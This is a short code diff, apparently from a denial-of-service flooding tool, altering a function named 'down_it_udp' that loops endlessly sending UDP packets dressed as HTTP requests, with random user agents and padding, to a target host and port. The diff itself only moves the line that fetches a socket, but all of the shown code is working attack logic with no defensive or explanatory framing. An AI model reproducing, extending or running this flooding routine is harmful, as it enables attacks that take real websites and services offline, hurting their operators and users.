@@ -16,13 +16,13 @@ import services
 def down_it_udp(_ctx: Context):
     i = 1
     while True:
+        sock = _ctx.sock_manager.get_udp_socket()
         extra_data = get_random_string(1, _ctx.max_random_packet_len) if _ctx.random_packet_len else ''
         packet = f'GET / HTTP/1.1' \
                  f'\nHost: {_ctx.host}' \
                  f'\n\n User-Agent: {random.choice(_ctx.user_agents)}' \
                  f'\n{_ctx.base_headers[0]}' \
                  f'\n\n{extra_data}'.encode('utf-8')
-        sock = _ctx.sock_manager.get_udp_socket()
 
         try:
             sock.sendto(packet, (_ctx.host, _ctx.port))
